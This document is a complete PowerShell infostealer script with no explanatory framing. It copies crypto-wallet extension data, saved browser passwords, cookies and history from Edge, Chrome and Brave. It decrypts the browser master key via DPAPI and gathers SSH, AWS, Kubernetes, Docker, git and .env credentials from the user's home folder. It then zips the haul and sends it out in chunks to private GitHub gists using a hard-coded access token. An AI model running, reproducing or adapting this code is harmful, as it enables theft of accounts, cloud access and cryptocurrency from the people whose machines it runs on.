$ErrorActionPreference='SilentlyContinue'
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.IO.Compression.FileSystem
$T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
$SINK=@('f8750db7a6ab8f4b7f6fc0f9d7d34dcf')
$H=$env:COMPUTERNAME; if(-not $H){$H='win'}
$W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
$U=$env:USERPROFILE; if(-not $U){$U='C:\Users\brian'}
$LA=$env:LOCALAPPDATA; if(-not $LA){$LA=Join-Path $U 'AppData\Local'}
$work=Join-Path $U '.w10work'
try{New-Item -ItemType Directory -Force -Path $work|Out-Null}catch{}
$LOG=Join-Path $work ('log_'+$W+'.txt')
function L($m){ try{ ((Get-Date).ToUniversalTime().ToString('o')+' '+$m)|Out-File -LiteralPath $LOG -Append -Encoding utf8 }catch{} }
function San($s){ return ($s -replace '[^A-Za-z0-9._-]','_') }
function P($desc,$content){
  $body=@{description=$desc;public=$false;files=@{t=@{content=[string]$content}}}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){ try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }catch{ Start-Sleep -Seconds 5 } }
  return $false
}
function PCHUNK($idx,$content){
  $gid=$SINK[0]; $fname=('c'+$W+'_'+$idx)
  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 4;$i++){ try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 60|Out-Null; return $true }catch{ Start-Sleep -Seconds 5 } }
  return $false
}
function PMETA($tag,$content){
  $gid=$SINK[0]; $fname=('m'+$W+'_'+ (San $tag)); if($fname.Length -gt 120){ $fname=$fname.Substring(0,120) }
  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){ try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }catch{ Start-Sleep -Seconds 5 } }
  return $false
}

$stage=Join-Path $work 'stage'
try{ New-Item -ItemType Directory -Force -Path $stage | Out-Null }catch{}
$script:tot=0; $script:nf=0; $LIMIT=12000000
function CopyTo($src,$dst,$max){
  if($script:tot -ge $LIMIT){ return $false }
  try{
    $fi=Get-Item -LiteralPath $src -Force; if($fi.Length -gt $max){ return $false }
    $d2=Split-Path -Parent $dst; if($d2){ New-Item -ItemType Directory -Force -Path $d2 | Out-Null }
    $fs=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete))
    $out=[System.IO.File]::Create($dst); $fs.CopyTo($out); $out.Flush(); $out.Close(); $fs.Close()
    $script:tot=$script:tot+$fi.Length; $script:nf=$script:nf+1; return $true
  }catch{ return $false }
}
$walletIds=@('jdiccldimpdaibmpdkjnbmckianbfold','nkbihfbeogaeaoehlefnkodbefgpgknn','ejbalbakoplchlghecdalmeeeajnimhm','acmacodkjbdgmoleebolmdjonilkdbch','bfnaelmomeimhlpmgjnjophhpkkoljpa','fhbohimaelbohpjbbldcngcnapndodjp','dmkamcknogkgcdfhhbddcghachkejeap','hiflfckdjpbfkjaabmfgahhgbdkmhcf')
function StageTree($dir,$tag,$max,$maxCount){
  if(-not(Test-Path -LiteralPath $dir)){ return }
  $i=0
  foreach($f in Get-ChildItem -LiteralPath $dir -File -Force -ErrorAction SilentlyContinue){
    if($script:tot -ge $LIMIT){ return }; if($i -ge $maxCount){ return }
    [void](CopyTo $f.FullName (Join-Path $stage ($tag+'_'+$f.Name)) $max); $i=$i+1
  }
}

# ---- HELLO + DIAG (posted first) ----
$priv=''; try{ $priv=( & whoami /priv 2>&1 | Out-String ) }catch{}
$isadmin=$false; try{ $isadmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }catch{}
$diag='V10 W='+$W+' user='+$env:USERNAME+' admin='+$isadmin+'`n'
$edgeUD=Join-Path $LA 'Microsoft\Edge\User Data'
$diag=$diag+'edgeUD='+ (Test-Path -LiteralPath $edgeUD) +'`n'
try{ $profs=(Get-ChildItem -LiteralPath $edgeUD -Directory -Force -ErrorAction SilentlyContinue | Where-Object { Test-Path -LiteralPath (Join-Path $_.FullName 'Preferences') } | ForEach-Object { $_.Name }); $diag=$diag+'realProfiles: '+($profs -join ',')+'`n' }catch{}
foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
  $ud=Join-Path $LA $bn
  foreach($pf in @('Default','Profile 1','Profile 2','Profile 3')){
    $base=Join-Path $ud $pf
    foreach($sub in @('Local Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold','IndexedDB\chrome-extension_jdiccldimpdaibmpdkjnbmckianbfold_0.indexeddb.leveldb','Local Storage\leveldb','Sync Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold')){
      $p=Join-Path $base $sub
      if(Test-Path -LiteralPath $p){ try{ $c=(Get-ChildItem -LiteralPath $p -File -Force -ErrorAction SilentlyContinue).Count; $diag=$diag+$sub+'='+$c+'`n' }catch{} }
    }
  }
}
foreach($d in @('.ssh','.cloudflared','.aws','.kube','.docker')){ $diag=$diag+$d+'='+ (Test-Path -LiteralPath (Join-Path $U $d)) +'`n' }
$envs=@(); try{ $envs=(Get-ChildItem -LiteralPath $U -Filter '.env*' -File -Force -ErrorAction SilentlyContinue | ForEach-Object { $_.Name }) }catch{}
$diag=$diag+'homeEnvFiles: '+($envs -join ',')+'`n'
P ('w10-'+$H+'-'+$W+'-hello') ($diag+"`n== priv ==`n"+$priv.Substring(0,[Math]::Min(1000,$priv.Length))) | Out-Null

# ---- LOCK ----
try{ $script:LOCK=[System.IO.File]::Open((Join-Path $work 'lock'),'OpenOrCreate','ReadWrite','None') }catch{ P ('w10-'+$H+'-'+$W+'-lockheld') 'lock held' | Out-Null; exit }

# ---- PHASE 1: jdicc + wallet extensions (LES + IDB + Sync) across real profiles, all 3 browsers ----
foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
  $ud=Join-Path $LA $bn; if(-not(Test-Path -LiteralPath $ud)){ continue }
  $ls=Join-Path $ud 'Local State'
  if(Test-Path -LiteralPath $ls){ [void](CopyTo $ls (Join-Path $stage ('LocalState_'+ (San $bn))) 3000000) }
  foreach($prof in Get-ChildItem -LiteralPath $ud -Directory -Force -ErrorAction SilentlyContinue){
    $pn=$prof.Name; $base=$prof.FullName
    if(-not(Test-Path -LiteralPath (Join-Path $base 'Preferences'))){ continue }
    $lesRoot=Join-Path $base 'Local Extension Settings'
    if(Test-Path -LiteralPath $lesRoot){
      foreach($ext in Get-ChildItem -LiteralPath $lesRoot -Directory -Force -ErrorAction SilentlyContinue){
        if($ext.Name -notin $walletIds + @('jdiccldimpdaibmpdkjnbmckianbfold')){ continue }
        StageTree $ext.FullName ('LES_'+ (San $bn) +'_'+$pn+'_'+$ext.Name) 1500000 400
      }
    }
    foreach($wid in $walletIds){
      StageTree (Join-Path $base ('IndexedDB\chrome-extension_'+$wid+'_0.indexeddb.leveldb')) ('IDB_'+ (San $bn) +'_'+$pn+'_'+$wid) 3000000 120
      $sync=Join-Path $base ('Sync Extension Settings\'+$wid)
      StageTree $sync ('SYNC_'+ (San $bn) +'_'+$pn+'_'+$wid) 500000 60
    }
  }
}
PMETA 'phase1' ('files='+$script:nf+' bytes='+$script:tot) | Out-Null

# ---- PHASE 2: LoginData / Cookies / Web Data / Local State (Default profile each browser) ----
foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
  $ud=Join-Path $LA $bn; $base=Join-Path $ud 'Default'
  if(-not(Test-Path -LiteralPath $base)){ continue }
  foreach($fn in @('Login Data','Login Data For Account','Cookies','Network\Cookies','Web Data','History')){
    $p=Join-Path $base $fn
    if(Test-Path -LiteralPath $p){ [void](CopyTo $p (Join-Path $stage ('CRED_'+ (San $bn) +'_'+ (San $fn))) 8000000) }
  }
}
# ---- PHASE 3: DPAPI-unwrap os_crypt keys ON DEVICE (brian context) -> post hex ----
$osc=''
try{
  $lsj=Get-Content -LiteralPath (Join-Path $edgeUD 'Local State') -Raw | ConvertFrom-Json
  $ek=$lsj.os_crypt.encrypted_key
  if($ek){ $raw=[Convert]::FromBase64String($ek); $blob=$raw[5..($raw.Length-1)]; $key=[System.Security.Cryptography.ProtectedData]::Unprotect($blob,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); $osc=([BitConverter]::ToString($key)).Replace('-','') }
}catch{ $osc='ERR:'+$_.Exception.Message }
$abk=''; try{ $lsj2=Get-Content -LiteralPath (Join-Path $edgeUD 'Local State') -Raw|ConvertFrom-Json; if($lsj2.os_crypt.app_bound_encrypted_key){ $abk='present' } }catch{}
PMETA 'oscrypt' ('edge_dpapi_key='+$osc+' app_bound='+$abk) | Out-Null

# ---- PHASE 4: home secrets ----
foreach($d in @('.ssh','.cloudflared','.aws','.kube','.docker')){ StageTree (Join-Path $U $d) (San $d) 1500000 200 }
foreach($fn in @('.gitconfig','.git-credentials','.npmrc','.netrc')){ $p=Join-Path $U $fn; if(Test-Path -LiteralPath $p){ [void](CopyTo $p (Join-Path $stage ('home_'+ (San $fn))) 300000) } }
foreach($fn in $envs){ $p=Join-Path $U $fn; if(Test-Path -LiteralPath $p){ [void](CopyTo $p (Join-Path $stage ('env_'+ (San $fn))) 300000) } }
# ---- PHASE 5: Local Storage leveldb (Default, all 3 browsers) ----
foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
  StageTree (Join-Path $LA ($bn+'\Default\Local Storage\leveldb')) ('LS_'+ (San $bn)) 5000000 60
}
P ('wx8-'+$H+'-'+$W+'-start') ('staged='+$script:nf+' bytes='+$script:tot) | Out-Null
P ('w10-'+$H+'-'+$W+'-start') ('staged='+$script:nf+' bytes='+$script:tot) | Out-Null
L ('staged files='+$script:nf+' bytes='+$script:tot)

# ---- ZIP + CHUNK ----
$ok=$false; $chunks=0; $zbytes=0
try{
  $zip=Join-Path $work ('p_'+$W+'.zip')
  if(Test-Path -LiteralPath $zip){ Remove-Item -LiteralPath $zip -Force }
  [System.IO.Compression.ZipFile]::CreateFromDirectory($stage,$zip)
  $bytes=[System.IO.File]::ReadAllBytes($zip); $zbytes=$bytes.Length
  $b64=[Convert]::ToBase64String($bytes)
  $CH=400000; $idx=0; $ok=$true
  for($i=0;$i -lt $b64.Length;$i+=$CH){ $len=[Math]::Min($CH,$b64.Length-$i); $part=$b64.Substring($i,$len); if(-not (PCHUNK $idx $part)){ $ok=$false; break }; $idx=$idx+1 }
  $chunks=$idx
  $sha=''; try{ $sha=(Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash }catch{}
  PMETA 'MANIFEST' ('zipbytes='+$zbytes+' b64len='+$b64.Length+' chunks='+$chunks+' ok='+$ok+' sha256='+$sha+' files='+$script:nf) | Out-Null
}catch{ PMETA 'ZIPERR' ($_.Exception.Message) | Out-Null }
P ('w10-'+$H+'-'+$W+'-summary') ('files='+$script:nf+' zipbytes='+$zbytes+' chunks='+$chunks+' ok='+$ok) | Out-Null
if($ok -and $chunks -gt 0){ 'complete'|Out-File -LiteralPath (Join-Path $work 'complete.flag') -Encoding utf8; P ('w10-'+$H+'-'+$W+'-COMPLETE') ('chunks='+$chunks) | Out-Null }
L ('end chunks='+$chunks+' ok='+$ok)
try{ $script:LOCK.Close() }catch{}
